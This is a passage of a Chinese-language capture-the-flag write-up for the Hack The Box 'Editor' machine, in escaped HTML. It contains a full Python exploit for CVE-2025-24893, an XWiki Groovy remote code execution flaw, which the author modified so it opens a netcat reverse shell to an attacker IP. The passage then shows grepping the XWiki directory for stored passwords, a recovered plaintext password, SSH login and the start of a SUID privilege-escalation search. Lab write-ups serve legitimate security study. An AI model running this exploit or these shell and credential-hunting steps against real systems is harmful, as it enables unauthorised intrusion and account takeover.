n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举测试\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e80\u003c/code\u003e 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e8080\u003c/code\u003e 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003eCVE-2025-32429 ❌\u003c/strong\u003e\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CVE-2025-32429 ./exploit -u http://wiki.editor.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003eCVE-2025-24893\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e再根据靶机上的版本 \u003ccode\u003e15.10.8\u003c/code\u003e 能搜索出来 \u003ccode\u003eCVE-2025-24893\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.exploit-db.com/exploits/52136\"\u003ehttps://www.exploit-db.com/exploits/52136\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e原本的 POC 是读取  \u003ccode\u003e/etc/passwd\u003c/code\u003e 的，这里修改为反弹 \u003ccode\u003eshell\u003c/code\u003e 的命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\n\n\u003cspan class=\"hljs-comment\"\u003e# Banner\u003c/span\u003e\ndef display_banner():\n    \u003cspan class=\"hljs-comment\"\u003e# 注意：这里原代码中的 print 语句没有缩进，\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 我已将其放入函数体内。\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"=\"\u003c/span\u003e * 80)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Exploit Author: Al Baradi Joy\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"GitHub Exploit: https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"=\"\u003c/span\u003e * 80)\n\n\u003cspan class=\"hljs-comment\"\u003e# Function to detect the target protocol (HTTP or HTTPS)\u003c/span\u003e\ndef detect_protocol(domain):\n    https_url = f\u003cspan class=\"hljs-string\"\u003e\"https://{domain}\"\u003c/span\u003e\n    http_url = f\u003cspan class=\"hljs-string\"\u003e\"http://{domain}\"\u003c/span\u003e\n\n    try:\n        response = requests.get(https_url, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=5, allow_redirects=True)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e response.status_code \u0026#x3C; 400:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[✔] Target supports HTTPS: {https_url}\"\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e https_url\n    except requests.exceptions.RequestException:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[!] HTTPS not available, falling back to HTTP.\"\u003c/span\u003e)\n\n    try:\n        response = requests.get(http_url, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=5, allow_redirects=True)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e response.status_code \u0026#x3C; 400:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[✔] Target supports HTTP: {http_url}\"\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e http_url\n    except requests.exceptions.RequestException:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[✖] Target is unreachable on both HTTP and HTTPS.\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(1)\n\n\u003cspan class=\"hljs-comment\"\u003e# Exploit function\u003c/span\u003e\ndef exploit(target_url):\n    target_url = detect_protocol(target_url.replace(\u003cspan class=\"hljs-string\"\u003e\"http://\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e).replace(\u003cspan class=\"hljs-string\"\u003e\"https://\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e).strip())\n    exploit_url = f\u003cspan class=\"hljs-string\"\u003e\"{target_url}/bin/get/Main/SolrSearch?media=rss\u0026#x26;text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22busybox%20nc%2010.10.14.62%201234%20-e%20/bin/bash%22.execute().text)%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D\"\u003c/span\u003e\n\n    try:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[+] Sending request to: {exploit_url}\"\u003c/span\u003e)\n        response = requests.get(exploit_url, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=10)\n\n        \u003cspan class=\"hljs-comment\"\u003e# Check if the exploit was successful\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e response.status_code == 200 and \u003cspan class=\"hljs-string\"\u003e\"root:\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e response.text:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[✔] Exploit successful! Output received:\"\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(response.text)\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[✖] Exploit failed. Status code: {response.status_code}\"\u003c/span\u003e)\n\n    except requests.exceptions.ConnectionError:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[✖] Connection failed. Target may be down.\"\u003c/span\u003e)\n    except requests.exceptions.Timeout:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[✖] Request timed out. Target is slow or unresponsive.\"\u003c/span\u003e)\n    except requests.exceptions.RequestException as e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[✖] Unexpected error: {e}\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# Main execution\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    display_banner()\n    target = input(\u003cspan class=\"hljs-string\"\u003e\"[?] Enter the target URL (without http/https): \"\u003c/span\u003e).strip()\n    exploit(target)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没话说，环境恶心人，后面一直 502\u003c/p\u003e\n\u003cp\u003e后面就是进入到 \u003ccode\u003eshell\u003c/code\u003e 后，在 \u003ccode\u003exwiki\u003c/code\u003e 的目录中能找到密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egrep -rE \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e /usr/lib/xwiki\n...\ntheEd1t0rTeam99\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003essh oliver@10.10.11.80\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功进入，读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eoliver@editor:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n0c0bf7xxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eid\u003c/code\u003e 信息，有一个奇特的组 \u003ccode\u003enetdata\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eoliver@editor:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(oliver) gid=1000(oliver) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1000(oliver),999(netdata)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e寻找拥有 \u003ccode\u003esuid\u003c/code\u003e 权限的程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eoliver@editor:~$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network\n/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin\n/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners\n/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo\n/opt/netdata/usr/libexec/netdata/plugins.d/ioping\n/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin\n/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin\n....\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e监听端口信息\u003c/p\u003e\n\u003cpre\
